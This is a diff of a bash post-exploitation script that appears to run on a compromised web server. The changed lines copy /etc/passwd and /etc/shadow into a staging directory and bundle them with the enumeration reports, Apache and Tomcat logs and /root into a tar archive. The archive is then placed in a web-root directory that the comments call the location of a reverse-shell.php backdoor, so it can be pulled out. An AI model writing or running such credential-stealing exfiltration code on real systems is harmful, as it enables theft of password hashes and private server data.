@@ -34,7 +34,8 @@ CheckRoot()
 #                                                                                             #
 ###############################################################################################
 
-Back_Door="/var/www/html/swancorp"                                                    # Where your reverse-shell.php is located
+Back_Door="/var/www/html/swancorp"   # Where your reverse-shell.php is located
+Tmp_Space="/tmp/re-port"             # Where you tar from
 Enum_Report=(Enum_Report-$(date "+%F-%H-%M-%S").txt)
 Enum_Log=(Enum_Webserver_Log-$(date "+%F-%H-%M-%S").txt)
 Err_Log=(Enum_Report_Error_Log-$(date "+%F-%H-%M-%S").txt)
@@ -749,10 +750,10 @@ echo -e "\n\n\nThe End" | tee -a $Enum_Report
 echo -e "\n\n\nThe End" | tee -a $Enum_Log
 echo -e "\n\n\nThe End" | tee -a $Err_Log
 
-cp /etc/passwd ${Back_Door}/E_passwd
-cp /etc/shadow ${Back_Door}/E_shadow
+cp /etc/passwd ${Tmp_Space}/E_passwd
+cp /etc/shadow ${Tmp_Space}/E_shadow
 
-tar -cf ER.tar $Enum_Report $Enum_Log $Enum_Cap $Err_Log $Back_Door /var/log/apache2 /var/log/tomcat7 /root E_mail E_pass.txt 
+tar -cf ER.tar $Enum_Report $Enum_Log $Enum_Cap $Err_Log $Back_Door /var/log/apache2 /var/log/tomcat7 /root E_mail E_pass E_shadow
 mv ER.tar ${Back_Door}/${Enum_Tar}
 
 rm -r /tmp/re-port
